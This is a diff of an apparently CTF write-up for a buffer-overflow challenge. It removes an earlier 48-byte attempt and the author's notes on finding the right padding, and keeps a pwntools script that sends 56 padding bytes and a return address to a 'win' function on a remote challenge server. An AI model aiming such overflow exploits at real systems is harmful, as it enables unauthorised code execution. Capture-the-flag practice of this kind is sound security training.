@@ -94,26 +94,6 @@ import os
 os.system('clear')
 context.log_level = 'debug'
 sh = remote('206.189.28.76',30687)
-p = b'A' * 48
-winAddr = 4198918 #0x401206
-p += p64(winAddr)
-sh.sendlineafter(b': ', p)
-sh.interactive()
-```
-
-18. When i ran the script, i didn't get the flag, i think the padding bytes is incorrect.
-19. When i add another 4 bytes, it's still, but when i add more 4 bytes (total 8 bytes added).
-20. I got the flag.
-
-> THE CORRECT PADDING BYTES - 56
-
-```py
-from pwn import *
-import os
-
-os.system('clear')
-context.log_level = 'debug'
-sh = remote('206.189.28.76',30687)
 p = b'A' * 56
 winAddr = 4198918 #0x401206
 p += p64(winAddr)
